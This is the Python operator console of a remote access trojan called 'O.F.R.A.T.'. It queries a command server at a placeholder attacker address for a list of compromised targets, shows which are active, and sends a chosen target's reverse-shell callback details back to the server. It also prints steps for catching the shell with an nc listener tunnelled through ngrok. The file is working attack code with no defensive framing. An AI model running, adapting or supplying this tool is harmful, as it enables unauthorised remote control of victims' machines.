import sys
import os
import requests

PASSWORD = "INSECURE_PASSWORD"                        # change this !
URL      = "http://your.attacker.machine:8080/"       # and this !

try:
    from requests import get, post
except:
    print("[!] Module requests not found !")
    print("[+] Installing...")
    os.system(f"{sys.executable} -m pip install --upgrade requests")

if not URL.endswith('/'):
    URL += '/'

def clear():
    if os.name == "nt":
        os.system("cls")
    else:
        os.system("clear")

def get_infos():
    req =  requests.post(f"{URL}api/get_infos", data={"pass": PASSWORD})
    if req.text == 'null':
        return None
    return req.json()

def send_infos(target, remote_host, remote_port):
    formated = f"{target}|{remote_host}:{remote_port}"
    requests.post(f"{URL}api/set_infos", data={"passwd": PASSWORD, "infos": formated})

def banner():
    small = r"""   ___   ___ ___     _   _____ 
  / _ \ | __| _ \   /_\ |_   _|
 | (_) || _||   /_ / _ \ _| |_ 
  \___(_)_(_)_|_(_)_/ \_(_)_(_)
"""

    medium = r"""    /^^^^        /^^^^^^^^   /^^^^^^^             /^          /^^^ /^^^^^^   
  /^^    /^^     /^^         /^^    /^^          /^ ^^             /^^       
/^^        /^^   /^^         /^^    /^^         /^  /^^            /^^       
/^^        /^^   /^^^^^^     /^ /^^            /^^   /^^           /^^       
/^^        /^^   /^^         /^^  /^^         /^^^^^^ /^^          /^^       
  /^^     /^^    /^^         /^^    /^^      /^^       /^^         /^^       
    /^^^^     /^^/^^      /^^/^^      /^^/^^/^^         /^^/^^     /^^    /^^
"""

    large = r"""
 @@@@@@        @@@@@@@@       @@@@@@@         @@@@@@        @@@@@@@             
@@@@@@@@       @@@@@@@@       @@@@@@@@       @@@@@@@@       @@@@@@@             
@@!  @@@       @@!            @@!  @@@       @@!  @@@         @@!               
!@!  @!@       !@!            !@!  @!@       !@!  @!@         !@!               
@!@  !@!       @!!!:!         @!@!!@!        @!@!@!@!         @!!               
!@!  !!!       !!!!!:         !!@!@!         !!!@!!!!         !!!                
!!:  !!!       !!:            !!: :!!        !!:  !!!         !!:               
:!:  !:!  :!:  :!:       :!:  :!:  !:!  :!:  :!:  !:!  :!:    :!:    :!:        
::::: ::  :::   ::       :::  ::   :::  :::  ::   :::  :::     ::    :::        
 : :  :   :::   :        :::   :   : :  :::   :   : :  :::     :     :::        
"""

    gts = os.get_terminal_size

    if gts()[0] < len(small.split('\n')[0]):
        print("""
    O.F.R.A.T.

""")
    elif gts()[0] < len(medium.split('\n')[0]):
        print(small)
    elif gts()[0] < len(large.split('\n')[0]):
        print(medium)
    else:
        print(large)

def print_list(infos):
    max_name_length = max(len(x[1]) for x in infos.values())
    for k, v in infos.items():
        hostname = v[1]

        if len(hostname) > 25:
            hostname = hostname[:22] + "..."

        if v[0] == '1':
            print(f"{k} (\33[33m{hostname}\33[0m) {' ' * (40 - len(k) - len(hostname))} : [  \33[32mactive\33[0m  ]\n")
        else:
            print(f"{k} (\33[33m{hostname}\33[0m) {' ' * (40 - len(k) - len(hostname))} : [ \33[31munactive\33[0m ]\n")
    
def main():
    clear()
    banner()
    print("[+] Getting target list...")
    infos = get_infos()
    if not infos:
        print("[!] No valid data from server !")
        print("[!] Quiting...")
        sys.exit(1)
    print("[+] Target list got :")
    print()
    print_list(infos)
    choice = input("[?] Do you want a reverse shell on a target ? (Y/N) : ")
    while not choice.upper() in ('Y', 'N'):
        choice = input("[?] Do you want a reverse shell on a target ? (Y/N) : ")
    if choice.upper() == 'N':
        print("[+] So, By !")
        sys.exit(0)
    else:
        target = input("[?] Enter target IP       : ")
        while not target in infos.keys():
            target = input("[?] Enter target IP       : ")
        print("[+] Please do the following :")
        print("\t- Open a new terminal")
        print("\t- Write \"nc -lvnp {your_port}\" in it")
        print("\t- Open another terminal")
        print("\t- Write \"ngrok tcp {your_port}\" in it")
        port = input("[?] Enter ngrok port      : ")
        good = False
        while not good:
            if port.isdigit():
                if int(port) > 0 and int(port) < 65535:
                    good = True
                else:
                    port = input("[?] Enter ngrok port      : ")
            else:
                port = input("[?] Enter ngrok port      : ")
        port = int(port)
        ip = input("[?] Enter the remote host : ")
        print("[+] Sending those informations...")
        send_infos(target, ip, port)
        print("[+] Informations sent, you should get a revshell soon.")
        print("[+] Hack well, stay legal, By !")
        sys.exit(0)

if __name__ == "__main__":
    main()
